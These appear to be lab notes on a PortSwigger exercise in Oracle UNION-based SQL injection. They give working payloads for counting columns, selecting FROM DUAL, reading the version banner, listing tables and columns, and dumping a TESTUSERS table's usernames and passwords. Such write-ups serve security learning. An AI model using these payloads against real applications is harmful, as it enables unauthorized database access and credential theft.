# Oracle

a parameter

' - Gives error

'' - Error disappears.

```
' ORDER BY 1-- OK
' ORDER BY 2-- OK
' ORDER BY 3-- OK
' ORDER BY 4-- OK
' ORDER BY 5-- ERROR

' UNION SELECT 'a',NULL,NULL,NULL-- ERROR
```

Something went wrong with the search: java.sql.SQLSyntaxErrorException: ORA-00923: FROM keyword not found where expected

> On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.\
> There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual\
> For more information, see our SQL injection cheat sheet.

We can use legit database from Oracle - FROM DUAL

```
' UNION SELECT NULL FROM DUAL-- ERROR
' UNION SELECT NULL,NULL FROM DUAL-- ERROR
' UNION SELECT NULL,NULL,NULL FROM DUAL-- ERROR
' UNION SELECT NULL,NULL,NULL,NULL FROM DUAL-- OK.

' UNION SELECT 'a',NULL,NULL,NULL FROM DUAL-- OK.
' UNION SELECT NULL,'a',NULL,NULL FROM DUAL-- OK.
‘ UNION SELECT NULL,NULL,’a',NULL FROM DUAL-- ERROR
' UNION SELECT NULL,NULL,1,NULL FROM DUAL-- OK.
```

\| Oracle | SELECT banner FROM v$version SELECT version FROM v$instance |

[https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

```
' UNION SELECT banner,NULL,NULL,NULL FROM v$version--
```

```
Oracle Database 18c Express Edition Release 18.0
```

https://www.oracletutorial.com/oracle-administration/oracle-show-tables/

```
' UNION SELECT table_name,NULL,NULL,NULL FROM user_tables-- OK.
' UNION SELECT table_name,NULL,NULL,NULL FROM all_tables-- OK.
' UNION SELECT table_name,NULL,NULL,NULL FROM dba_tables-- ERROR.
```

```
' UNION SELECT column_name,NULL,NULL,NULL FROM all_tab_columns WHERE table_name='TESTUSERS'--
```

```
PASSWORD
USERID
USERNAME
```

```
' UNION SELECT PASSWORD,USERNAME,USERID,NULL FROM TESTUSERS--
```
